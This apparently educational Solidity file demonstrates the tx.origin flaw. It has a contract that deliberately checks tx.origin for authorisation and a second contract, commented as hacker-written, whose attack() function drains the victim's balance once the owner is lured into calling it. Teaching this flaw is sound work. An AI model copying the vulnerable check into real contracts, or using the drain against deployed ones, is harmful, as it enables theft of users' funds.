// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/// @dev 基础合约
contract BaseContract {
    address owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) external {
        require(tx.origin == owner, "No permission.");  // 使用tx.origin进行身份验证
        payable(_to).transfer(_amount);
    }

    function getContractBalance() external view returns (uint) {
        return address(this).balance;
    }

    function getOwner() external view returns (address) {
        return owner;
    }
}

/// @dev 攻击合约（黑客编写）
contract Attack {
    address payable owner;
    BaseContract bc;

    constructor(BaseContract _bcAddr) {
        owner = payable(msg.sender);
        bc = BaseContract(_bcAddr);
    }

    function attack() external {
        bc.transfer(owner, address(bc).balance);
    }

    function getOwnerbalance() external view returns (uint) {
        return address(owner).balance;
    }
}